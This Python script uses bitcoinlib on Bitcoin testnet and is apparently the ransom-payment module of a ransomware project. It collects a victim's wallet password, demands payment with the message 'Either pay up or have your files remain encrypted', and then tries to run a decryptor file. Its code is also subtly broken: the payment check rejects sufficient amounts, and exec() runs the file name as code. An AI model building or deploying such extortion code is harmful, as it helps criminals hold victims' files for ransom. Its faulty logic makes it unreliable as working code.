from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
from bitcoinlib.services.services import Service


def bitcoin_transaction():
    print("Starting the Bitcoin Testnet Transaction Procedure")

    decryption_executable_files = ["decrypt.py", "decrypt.exe"]

    # Get user input for wallet name and password
    wallet_name: str = input("Name of your bitcoin wallet: ")
    wallet_password: str = input("Password of your bitcoin wallet: ")

    try:
        # Check if wallet exists, if so then opens wallet
        if wallet_exists(wallet_name):
            print("Wallet found!")
            wallet = wallet_create_or_open(wallet_name, password=wallet_password, network="testnet")
        else:
            raise LookupError("Wallet not found! Please double-check the wallet name.")

        print(f"Your testnet wallet address: {wallet.get_key().address}")

        # Iterates through testnet database to look for transactions by the wallet
        service = Service(network="testnet")
        wallet.scan(network="testnet")
        transactions = service.gettransactions(wallet.get_key().address)

        # TODO: Set this to some number of testnet bitcoins
        amount_to_decrypt_files: int = 0

        print(f"Transactions: {transactions}")
        print("Current Balance:", wallet.balance())


        # Get the amount to send
        amount_to_send: float = float(input("\nEnter the amount of Bitcoins to send: "))

        # TODO: Create a Testnet bitcoin wallet to receive bitcoins
        receiver_address: str = input("Enter the Testnet Bitcoin address to send coins to: ")

        # Verifies that user has the funds to back the transaction
        if amount_to_send > wallet.balance():
            raise ValueError("You lack the necessary funds to fulfill the transaction."
                             " Add more testnet BTC to your wallet.")
        elif amount_to_send >= amount_to_decrypt_files:
            raise ValueError("You lack the necessary funds to fulfill the terms of our agreement..."
                             " Either pay up or have your files remain encrypted.")

        print("\nInitiating transaction...")

        # Carries out the transaction
        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet")

        # Queries through the testnet database to retrieve
        service = Service(network="testnet")
        transaction_details = service.gettransaction(wallet_transaction.txid)

        #  Iterates through transaction details to retrieve the
        outputs = transaction_details.get('outputs', [])
        for output in outputs:
            address = output.get('address')
            # Checks if the user successfully sent the specified number of bitcoins
            if address == receiver_address:
                import os
                # Looks for the decryption file to decrypt a user's file
                for executable in decryption_executable_files:
                    if os.path.exists(executable):
                        exec(f"{executable}")

        print(f"\nTransaction Details: {transaction_details}")

    except LookupError as le:
        print(f"Look Up Error: {le}")
    except ValueError as ve:
        print(f"Value Error: {ve}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


bitcoin_transaction()
